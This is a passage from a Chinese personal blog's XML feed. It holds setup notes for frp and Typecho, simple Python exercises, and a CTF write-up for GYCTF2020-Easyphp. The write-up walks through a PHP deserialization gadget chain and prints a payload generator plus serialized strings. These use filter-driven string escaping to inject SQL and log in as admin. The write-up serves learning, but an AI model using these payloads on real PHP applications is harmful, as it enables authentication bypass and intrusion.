title="PS1:修改云服务器端（Frps）配置"></a>PS1:修改云服务器端（Frps）配置</h2><pre class="line-numbers language-none"><code class="language-none">sudo vim &#x2F;etc&#x2F;frp&#x2F;frps.inisudo systemctl restart frps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="PS2-修改本地（Frpc）配置"><a href="#PS2-修改本地（Frpc）配置" class="headerlink" title="PS2:修改本地（Frpc）配置"></a>PS2:修改本地（Frpc）配置</h2><pre class="line-numbers language-none"><code class="language-none">sudo vim &#x2F;etc&#x2F;frp&#x2F;frpc.inisudo systemctl restart frpc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="PS3-开启日志"><a href="#PS3-开启日志" class="headerlink" title="PS3:开启日志"></a>PS3:开启日志</h2><pre class="line-numbers language-none"><code class="language-none">[common]# console or real logFile path like .&#x2F;frps.log or .&#x2F;frpc.loglog_file &#x3D; &#x2F;tmp&#x2F;frps.log# trace, debug, info, warn, errorlog_level &#x3D; infolog_max_days &#x3D; 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0001-客户端开始尝试"><a href="#0001-客户端开始尝试" class="headerlink" title="0001 客户端开始尝试"></a>0001 客户端开始尝试</h1><p>从给他github上面下载个frp的客户端，下amd64的那个。</p><p>~还没调好，先放放吧，内网穿透本来用处也不大，除非你有个永远也不换关机的客户端，而这个客户端完全可以换成docker。等等再搞吧~</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python基础练习</title>
      <link href="2020/12/05/python%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/"/>
      <url>2020/12/05/python%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>前一段时间做过不长时间（差不多就一周吧）的算法题，现在忘得差不多了，再找个网站做一下吧</strong></p><p><a href="http://www.pythontip.com/coding/code_oj?page=1">PythonTip</a></p><blockquote><p>说明：我会将我的测试代码(就是给数据的那里)封下来，方便将来自己查看</p></blockquote><h2 id="1-a-b"><a href="#1-a-b" class="headerlink" title="1.a + b"></a>1.a + b</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         a+b</span><span class="token comment"># Description:  </span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/5</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-列表排序"><a href="#2-列表排序" class="headerlink" title="2.列表排序"></a>2.列表排序</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         2.列表排序</span><span class="token comment"># Description:  </span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/5</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># data = [8, 7, 6, 5, 4, 3, 2, 1]</span><span class="token comment"># data.sort()</span><span class="token comment"># print(data)</span>L<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>L<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-第3题：字符串逆序"><a href="#3-第3题：字符串逆序" class="headerlink" title="3.第3题：字符串逆序"></a>3.第3题：字符串逆序</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         字符串逆序</span><span class="token comment"># Description:  </span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/5</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># a = 'xydz'</span><span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-输出字典key"><a href="#4-输出字典key" class="headerlink" title="4.输出字典key"></a>4.输出字典key</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         输出字典key</span><span class="token comment"># Description:  这一行就离谱嗷</span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/5</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># a = &#123;1: 1, 2: 2, 3: 3&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-第5题：输出字符奇数位置的字符串"><a href="#5-第5题：输出字符奇数位置的字符串" class="headerlink" title="5.第5题：输出字符奇数位置的字符串"></a>5.第5题：输出字符奇数位置的字符串</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: utf-8 -*-#</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># Name:         第5题：输出字符奇数位置的字符串</span><span class="token comment"># Description:  </span><span class="token comment"># Author:       M4XLMUM</span><span class="token comment"># Date:         2020/12/5</span><span class="token comment"># -------------------------------------------------------------------------------</span><span class="token comment"># 题目描述：</span><span class="token comment"># 给你一个字符串 a， 输出a中奇数位置字符构成的字符串（位置编号从1开始）。</span><span class="token comment"># 例如：a=‘xyzwd’</span><span class="token comment"># 则输出:xzd</span><span class="token comment"># a = '01234567'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 算法练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>装typecho</title>
      <link href="2020/12/02/%E5%B0%86blog%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>2020/12/02/%E5%B0%86blog%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>试一下typecho看看好备份不。<br><a href="http://yrclubs.com/archives/46/">照这个</a></p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><strong>先拉个docker镜像</strong><br><pre class="line-numbers language-none"><code class="language-none">docker pull 80x86&#x2F;typecho<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>创建docker容器</strong><br><pre class="line-numbers language-none"><code class="language-none">docker run -d --name&#x3D;typecho-blog --restart always -e PHP_TZ&#x3D;Asia&#x2F;Shanghai -e PHP_MAX_EXECUTION_TIME&#x3D;600 -p 8081:80 80x86&#x2F;typecho:latest<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p><strong>主题配置</strong><br><pre class="line-numbers language-none"><code class="language-none">docker cp &#x2F;home&#x2F;typecho&#x2F;Typecho-Theme-RAW c507450f5c9f:&#x2F;data&#x2F;themes&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> blog </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Easyphp</title>
      <link href="2020/12/01/GYCTF2020-Easyphp/"/>
      <url>2020/12/01/GYCTF2020-Easyphp/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>www.zip源码，是反序列化，</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>1.首先利用点在<code>update.php</code>文件里面，有个<code>$user-&gt;update()</code>的函数调用，然后进入<code>lib.php</code>文件。<br>2.下面为利用得到的部分代码，unserialize()反序列化了<code>this-&gt;getNewinfo()</code>，然后看这个方法。<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$Info</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getNewinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$Info</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token punctuation">;</span>        <span class="token variable">$updateAction</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$Info</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"update user SET age=<span class="token interpolation"><span class="token variable">$age</span></span>,nickname=<span class="token interpolation"><span class="token variable">$nickname</span></span> where id="</span><span class="token punctuation">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//这个功能还没有写完 先占坑</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>3.下面是这个方法的内容，可以传入age与nickname，然后这里会对我们传入的值实例化一个Info对象，并进行safe()危险字符过滤，所以上面第二步反序列化的不是我们想要的，然后看safe()函数<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getNewInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$age</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token variable">$age</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>4.下面是safe()函数内容，可以看到把没有6字符的单词都替换了，这里一般情况下可能是没有多大问题的，但是我们可以控制序列化的内容进而控制反序列化的内容，看UpdateHelper类<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">safe</span><span class="token punctuation">(</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$array</span><span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'union'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'regexp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'load'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'into'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'file'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'insert'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"'"</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'\\'</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"*"</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"alter"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'hacker'</span><span class="token punctuation">,</span><span class="token variable">$parm</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>5.有个析构方法的内容如下，这里如果sql实例化为一个对象就能调用<code>__toString</code>魔术方法了，这里因为<code>User</code>类里面有这个魔术方法，下面看User类里面的该魔术方法<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>6.<strong>toString魔术方法如下，调用nickname下属的方法，如果将nickname实例化为Info类的一个对象，因为没有update方法，触发Info类的</strong>call()方法，参数为<code>$age</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token double-quoted-string string">"0-0"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>7.__call方法如下，<code>$argument[0]</code>是我们传入的<code>$age</code>参数，如CtrlCase实例化为dbCtrl类的一个对象，就会调用<code>dbCtrl.login($sql)</code>，这样的话<code>$sql</code>参数就能被控制了，就是传入的<code>$age</code><br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$argument</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$argument</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$nickname</span><span class="token operator">=</span><span class="token constant">null</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span><span class="token single-quoted-string string">'select 1,"c4ca4238a0b923820dcc509a6f75849b" from user where username=?'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">nickname</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$CtrlCase</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">CtrlCase</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">Class</span> UpdateHelper<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$sql</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">sql</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">dbCtrl</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UpdateHelper</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这是如果没有上面的safe()方法条件下的payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"UpdateHelper"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"sql"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"select 1,"</span>c4ca4238a0b923820dcc509a6f75849b<span class="token double-quoted-string string">" from user where username=?"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"nickname"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Info"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"CtrlCase"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"dbCtrl"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>如果直接传入正常参数的话，序列化之后是这样的<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Info"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"18"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"nickname"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"loveu"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"CtrlCase"</span><span class="token punctuation">;</span><span class="token constant">N</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>这里可以构造<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token double-quoted-string string">";s:8:"</span>CtrlCase<span class="token double-quoted-string string">";O:12:"</span>UpdateHelper<span class="token double-quoted-string string">":1:&#123;s:3:"</span>sql<span class="token double-quoted-string string">";O:4:"</span>User<span class="token double-quoted-string string">":2:&#123;s:3:"</span>age<span class="token double-quoted-string string">";s:70:"</span>select <span class="token number">1</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"c4ca4238a0b923820dcc509a6f75849b"</span> from user where username<span class="token operator">=</span><span class="token operator">?</span><span class="token double-quoted-string string">";s:8:"</span>nickname<span class="token double-quoted-string string">";O:4:"</span>Info<span class="token double-quoted-string string">":1:&#123;s:8:"</span>CtrlCase<span class="token double-quoted-string string">";O:6:"</span>dbCtrl<span class="token double-quoted-string string">":2:&#123;s:4:"</span>name<span class="token double-quoted-string string">";s:5:"</span>admin<span class="token double-quoted-string string">";s:8:"</span>password<span class="token double-quoted-string string">";s:1:"</span><span class="token number">1</span>"<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>最后多加上个<code>&#125;</code>闭合，就会造成如下<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Info"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"18"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">263</span><span class="token punctuation">:</span><span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"CtrlCase"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"UpdateHelper"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"sql"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"User"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"age"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">70</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"select 1,"</span>c4ca4238a0b923820dcc509a6f75849b<span class="token double-quoted-string string">" from user where username=?"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"nickname"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"Info"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"CtrlCase"</span><span class="token punctuation">;</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"dbCtrl"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"admin"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"password"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token double-quoted-string string">"1"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 